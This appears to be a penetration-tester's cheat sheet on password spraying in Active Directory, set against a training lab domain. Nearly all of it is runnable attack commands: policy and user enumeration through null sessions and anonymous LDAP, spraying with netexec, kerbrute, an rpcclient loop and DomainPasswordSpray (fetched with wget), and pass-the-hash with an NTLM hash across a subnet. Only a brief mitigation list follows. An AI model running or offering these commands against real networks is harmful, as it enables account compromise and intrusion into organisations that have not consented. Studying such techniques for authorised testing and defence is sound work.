## Enumerating Password Policy inside the domain
- using `nxc smb`
```shell
nxc smb <domain-name> -u myuser -p hispasswd --pass-pol
```

## check if anyone using his username as his password?
```shell
nxc smb domain.name -u users.txt -p users.txt --continue-on-success # optional to grep on the success [grep '+']
```
## Spray a given password against all users
```shell
nxc smb domain.name -u users.txt -p ohhDonthacktheback123 --continue-on-success
```
## using Invoke-DomainPasswordSpray 
```powershell
wget https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/refs/heads/master/DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Summer2025!  -UserList .\users.txt -Force
Invoke-DomainPasswordSpray -UsernameAsPassword -UserList .\users.txt
```


# Password Spraying
## Enumerating password policy 
### Linux
1. Identify the password policy to prevent triggers with credentials
```
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
2. identifying password policy without creds `SMB NULL session`
```bash
rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo # to confirm nulll session
rpcclient $> getdompwinfo
```
```bash
enum4linux -P 172.16.5.5   # or we can use the newer one enum4linux-ng
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
3. Using `ldapsearch` 
```bash
ldapsearch -H 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
---
### Windows
1. using built-in `net.exe`
```powerhsell
net accounts
```
2. using poweview.ps1
```
import-module .\PowerView.ps1
Get-DomainPolicy
```
---
## Making a Target User List
### SMB NULL session
1. `enum4linux`
```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
2. `rpcclient`
```bash
rpcclient -U "" -N 172.16.5.5
```
3. `netexec`
```bash
nxc smb 172.16.5.5 --users
```
### LDAP Anonymous Bind
1. `ldapsearch`
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```
2. `windapsearch.py
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
### Using `kerbrute` 
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
## Launching the spray
### Linux
1. `rpcclient` one-liner
```bash
for u in $(cat users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
2. `kerbrute`
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
3. `netexec`
```bash
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
4. spraying the local administrators password reuse `netexec`
```bash
sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
### Windows
1. using `DomainPasswordSpray.ps1` : If the host is Domain-joined, the script query the domain for users and it gets the password policy and launch refined password spray with the password we have. 
```powershell
Import-Module .\DomainPsswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -Outfile valid_spray.txt -ErrorAction SilentlyContinue
```
## Mitigations
1. Multi-factor Authentication
2. Restricting Access
3. Reducing Impact of Successful Exploitation
4. Password Hygiene
